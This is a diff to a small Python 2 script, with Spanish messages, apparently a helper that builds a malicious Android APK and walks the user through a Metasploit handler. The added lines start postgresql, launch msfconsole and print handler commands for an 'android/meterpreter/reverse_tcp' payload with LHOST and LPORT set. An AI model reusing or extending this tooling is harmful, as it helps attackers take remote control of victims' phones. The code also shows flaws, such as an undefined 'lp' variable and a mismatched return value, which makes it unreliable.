@@ -24,6 +24,8 @@ class createAPK:
         
         self.launchProcess(com)
         
+        return ipl
+        
 ##PARSER SHIT
 parser = argparse.ArgumentParser(description='Testing')
         #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
@@ -35,8 +37,18 @@ parser.add_argument('lp', metavar='lp', type=str, nargs='+',
 args = parser.parse_args()
 ##//PARSER SHIT---------
 
+print "Generando APK..."
 APK = createAPK()
-APK.create(args.app_name, args.lp)
+print "Iniciando postgresql..."
+ipl = APK.launchProcess("gnome-terminal -e 'bash -c \"service postgresql start; exec bash\"'")
+print "Iniciando msfconsole en nueva ventana..."
 APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
+print "--usa esta guia--"
+print "use exploit/multi/handler"
+print "set payload android/meterpreter/reverse_tcp"
+print "set LHOST " + ipl
+print "set LPORT "+ lp
+print "exploit"
+APK.create(args.app_name, args.lp)
 
-raw_input("Press Enter to continue...")
+raw_input("Presiona una tecla cuando hayas configurado el handler...")
